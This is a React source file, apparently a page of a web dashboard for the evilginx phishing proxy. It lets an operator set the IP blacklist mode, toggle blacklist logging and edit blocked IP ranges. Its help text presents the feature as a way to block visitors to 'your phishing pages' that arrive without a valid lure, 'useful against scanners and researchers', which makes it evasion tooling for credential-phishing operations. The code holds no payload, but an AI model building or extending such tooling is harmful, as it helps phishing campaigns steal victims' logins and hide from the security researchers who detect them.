import React, { useEffect, useState } from 'react';
import { api } from '../lib/api.js';
import Info from '../components/Info.jsx';

const MODES = [
  { value: 'all', help: 'Blacklist IPs for every request, even authorized ones. Most aggressive.' },
  { value: 'unauth', help: 'Blacklist IPs only for unauthorized/unmatched requests. Default.' },
  { value: 'noadd', help: 'Block requests from already-blacklisted IPs, but stop adding new ones.' },
  { value: 'off', help: 'Disable blacklisting entirely — allow every request through.' },
];

export default function Blacklist() {
  const [raw, setRaw] = useState('');
  const [ips, setIps] = useState('');
  const [error, setError] = useState('');
  const [saved, setSaved] = useState(false);

  function refresh() {
    api.get('/api/blacklist').then((d) => { setRaw(d.raw); setIps(d.ips); }).catch((e) => setError(e.message));
  }
  useEffect(refresh, []);

  async function setMode(mode) {
    setError('');
    try {
      const res = await api.post('/api/blacklist/mode', { mode });
      setRaw(res.raw);
    } catch (e) {
      setError(e.message);
    }
  }

  async function toggleLog(enabled) {
    setError('');
    try {
      const res = await api.post('/api/blacklist/log', { enabled });
      setRaw(res.raw);
    } catch (e) {
      setError(e.message);
    }
  }

  async function saveIps() {
    setError('');
    setSaved(false);
    try {
      await api.put('/api/blacklist/ips', { ips });
      setSaved(true);
    } catch (e) {
      setError(e.message);
    }
  }

  const currentMode = /blacklist mode set to: (\w+)/.exec(raw)?.[1] || (/mode\s*: (\w+)/.exec(raw)?.[1]);

  return (
    <div className="stack">
      <h2>Blacklist <Info text="Automatically blocks IP addresses that hit your phishing pages without a valid lure/session — useful against scanners and researchers." /></h2>
      {error && <div className="error-text">{error}</div>}

      <div className="card stack">
        <h3 style={{ margin: 0 }}>Mode</h3>
        <div className="row wrap">
          {MODES.map((m) => (
            <button key={m.value} className={currentMode === m.value ? 'primary' : ''} onClick={() => setMode(m.value)} title={m.help}>
              {m.value}
            </button>
          ))}
        </div>
        <p className="dim" style={{ margin: 0 }}>
          all: blacklist every request (even authorized) · unauth: only unauthorized requests ·
          noadd: block without adding new IPs · off: disabled
        </p>
        <div className="row">
          <button onClick={() => toggleLog(true)}>Enable blacklist logging</button>
          <button onClick={() => toggleLog(false)}>Disable blacklist logging</button>
          <Info text="When enabled, evilginx logs a message every time it blocks a request from a blacklisted IP." />
        </div>
      </div>

      <div className="card">
        <div className="row" style={{ justifyContent: 'space-between' }}>
          <h3 style={{ margin: 0 }}>Blacklisted IPs / masks</h3>
          <div className="row">
            {saved && <span className="dim">Saved</span>}
            <button className="primary" onClick={saveIps}>Save</button>
          </div>
        </div>
        <p className="dim">One IP or CIDR mask per line. Takes effect after restarting evilginx.</p>
        <textarea
          value={ips}
          onChange={(e) => { setIps(e.target.value); setSaved(false); }}
          rows={12}
          style={{ width: '100%', fontFamily: 'monospace', resize: 'vertical' }}
        />
      </div>

      <div className="card">
        <div className="row" style={{ justifyContent: 'space-between' }}>
          <h3 style={{ margin: 0 }}>Status</h3>
          <button onClick={refresh}>Refresh</button>
        </div>
        <pre style={{ whiteSpace: 'pre-wrap', fontSize: 12 }}>{raw}</pre>
      </div>
    </div>
  );
}
